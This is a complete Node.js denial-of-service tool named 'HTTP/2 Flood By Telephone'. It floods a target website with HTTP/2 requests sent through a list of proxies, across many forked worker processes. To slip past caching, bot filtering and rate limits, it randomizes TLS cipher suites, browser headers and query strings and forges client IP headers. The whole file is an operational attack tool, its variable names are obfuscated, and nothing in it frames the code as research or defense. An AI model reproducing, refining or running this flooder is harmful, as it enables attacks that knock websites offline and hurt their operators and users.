const url = require("url"), fs = require("fs"), http2 = require("http2"), http = require("http"), tls = require("tls"), net = require("net"), cluster = require("cluster"), colors = require("colors");
cplist = ["RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM", "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM", "ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA", "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA", "options2.TLS_AES_128_GCM_SHA256:options2.TLS_AES_256_GCM_SHA384:options2.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:options2.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256:options2.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:options2.TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:options2.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:options2.TLS_ECDHE_ECDSA_WITH_RC4_128_SHA:options2.TLS_RSA_WITH_AES_128_CBC_SHA:options2.TLS_RSA_WITH_AES_128_CBC_SHA256:options2.TLS_RSA_WITH_AES_128_GCM_SHA256:options2.TLS_RSA_WITH_AES_256_CBC_SHA", ":ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK", "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH", "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM", "ECDHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES128-GCM-SHA256:!aNULL:!eNULL:!LOW:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS:!RC4", "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH", "EECDH+AESGCM:EDH+AESGCM:CHACHA20:!SHA1:!SHA256:!SHA384", "EECDH+AESGCM:EDH+AESGCM", "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL", "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5", "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS", "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK"], accept_header = ["text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3"], lang_header = ["he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7", "fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5", "en-US,en;q=0.5", "en-US,en;q=0.9", "de-CH;q=0.7", "da, en-gb;q=0.8, en;q=0.7", "cs;q=0.5"], encoding_header = ["deflate, gzip, br", "gzip", "deflate", "br"], control_header = ["no-cache", "max-age=0"], pathts = ["?s=", "/?", "", "?q=", "?true=", "?"], querys = ["", "&", "", "&&", "and", "=", "+", "?"], refers = ["https://www.google.com", "https://check-host.net", "https://www.facebook.com", "https://google.com", "https://youtube.com", "https://facebook.com"], browsers = ["Microsoft Edge", "Google Chrome", "Firefox", "Safari", "Opera", "Chrome Android", "Samsung Internet", "WebView Android"], sechuas = ["Android", "Chrome OS", "Chromium OS", "iOS", "Linux", "macOS", "Unknown", "Windows"], ignoreNames = ["RequestError", "StatusCodeError", "CaptchaError", "CloudflareError", "ParseError", "ParserError"], ignoreCodes = ["SELF_SIGNED_CERT_IN_CHAIN", "ECONNRESET", "ERR_ASSERTION", "ECONNREFUSED", "EPIPE", "EHOSTUNREACH", "ETIMEDOUT", "ESOCKETTIMEDOUT", "EPROTO"];
process.on("uncaughtException", function (noar) {
  if (noar.code && ignoreCodes.includes(noar.code) || noar.name && ignoreNames.includes(noar.name)) {
    return false;
  }
}).on("unhandledRejection", function (rossalind) {
  if (rossalind.code && ignoreCodes.includes(rossalind.code) || rossalind.name && ignoreNames.includes(rossalind.name)) {
    return false;
  }
}).on("warning", ogheneruno => {
  if (ogheneruno.code && ignoreCodes.includes(ogheneruno.code) || ogheneruno.name && ignoreNames.includes(ogheneruno.name)) {
    return false;
  }
}).setMaxListeners(0);
const ip_spoof = () => {
  const prenella = () => {
    return Math.floor(Math.random() * 255);
  };
  return `${""}${prenella()}${"."}${prenella()}${"."}${prenella()}${"."}${prenella()}${""}`;
};
function randstr(teral) {
  var raey = "";
  var leno = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  var zeremiah = leno.length;
  for (var cherolyn = 0; cherolyn < teral; cherolyn++) {
    raey += leno.charAt(Math.floor(Math.random() * zeremiah));
  }
  ;
  return raey;
}
if (process.argv.length < 8) {
  console.log("	");
  console.log("		HTTP/2 Flood By Telephone".green.bold);
  console.log("	");
  console.log("Usage: node file_name <GET/HEAD/POST> <host> <proxies> <duration> <rate> <thread>");
  process.exit(0);
}
;
var rate = process.argv[6];
var method = process.argv[2];
var proxys = fs.readFileSync(process.argv[4], "utf-8").toString().replace(/\r/g, "").split("\n");
var fakeuas = fs.readFileSync("ua.txt", "utf-8").toString().replace(/\r/g, "").split("\n");
if (cluster.isMaster) {
  const dateObj = new Date;
  for (var bb = 0; bb < process.argv[7]; bb++) {
    cluster.fork();
  }
  ;
  console.log("HTTP/2 Flood by Telephone".red.bold);
  setTimeout(() => {
    console.log("Attack ended.".green.bold);
    process.exit(-1);
  }, process.argv[5] * 1e3);
} else {
  function flood() {
    var lynae = url.parse(process.argv[3]);
    var kahory = fakeuas[Math.floor(Math.random() * fakeuas.length)];
    const jonnatan = ip_spoof();
    var valeska = querys[Math.floor(Math.random() * querys.length)];
    var gor = refers[Math.floor(Math.random() * refers.length)];
    var conception = cplist[Math.floor(Math.random() * cplist.length)];
    var shanyah = proxys[Math.floor(Math.random() * proxys.length)].split(":");
    var dagan = {":method": method, ":path": lynae.path + pathts[Math.floor(Math.random() * pathts.length)] + randstr(15) + valeska + randstr(15), ":scheme": "https", Origin: lynae.host, Accept: accept_header[Math.floor(Math.random() * accept_header.length)], "Accept-encoding": encoding_header[Math.floor(Math.random() * encoding_header.length)], "Accept-Language": lang_header[Math.floor(Math.random() * lang_header.length)], "Cache-Control": control_header[Math.floor(Math.random() * control_header.length)], DNT: "1", "Sec-ch-ua": browsers[Math.floor(Math.random() * browsers.length)] + ";v=105,Not;A Brand;v=99,Chromium;v=105", "sec-ch-ua-platform": sechuas[Math.floor(Math.random() * sechuas.length)], "X-Frame-Options": "DENY", "X-Content-Type-Options": "nosniff", "X-XSS-Protection": "1; mode=block", "sec-fetch-dest": "document", "sec-fetch-mode": "navigate", "sec-fetch-site": "none", "sec-fetch-user": "?1", "sec-gpc": "1", TE: "trailers", Trailer: "Max-Forwards", Pragma: "client-x-cache-on, client-x-cache-remote-on, client-x-check-cacheable, client-x-get-cache-key, client-x-get-extracted-values, client-x-get-ssl-client-session-id, client-x-get-true-cache-key, client-x-serial-no, client-x-get-request-id,client-x-get-nonces,client-x-get-client-ip,client-x-feo-trace", "Upgrade-Insecure-Requests": "1", "X-Forwarded-Proto": "HTTP", "X-Forwarded-For": jonnatan, "X-Forwarded-Host": jonnatan, Via: jonnatan, "Client-IP": jonnatan, "Real-IP": jonnatan, Referer: gor, "User-agent": kahory};
    const jakevion = new http.Agent({keepAlive: true, keepAliveMsecs: 5e4, maxSockets: 128});
    var korinthian = http.request({host: shanyah[0], agent: jakevion, globalAgent: jakevion, port: shanyah[1], timeout: 1e4, ciphers: conception, headers: {Host: lynae.host, "Proxy-Connection": "Keep-Alive", Connection: "Keep-Alive"}, method: "CONNECT", path: lynae.host + ":443"}, function () {
      korinthian.setSocketKeepAlive(true);
    });
    korinthian.on("connect", function (taressa, angelmanuel, laterria) {
      const jakylin = http2.connect(lynae.href, {createConnection: () => {
        return tls.connect({host: lynae.host, ciphers: tls.getCiphers().join(":") + conception, secureProtocol: "TLS_method", servername: lynae.host, uri: lynae.host, curve: "GREASE:X25519:x25519", clientTimeout: 5e3, clientmaxTimeout: 1e4, challengesToSolve: 10, resolveWithFullResponse: true, HonorCipherOrder: true, Compression: false, UseStapling: true, SessionTickets: false, requestCert: true, gzip: true, port: 443, sigals: "rsa_pss_rsae_sha256", strictSSL: false, secure: true, rejectUnauthorized: false, ALPNProtocols: ["h2"], socket: angelmanuel}, function () {
          for (let jeremi = 0; jeremi < rate; jeremi++) {
            const tagg = jakylin.request(dagan);
            tagg.setEncoding("utf8");
            tagg.on("data", arman => {
              delete arman;
            });
            tagg.on("response", () => {
              tagg.close();
            });
            tagg.end();
          }
        });
      }});
    });
    korinthian.end();
  }
  setInterval(() => {
    flood();
  });
}
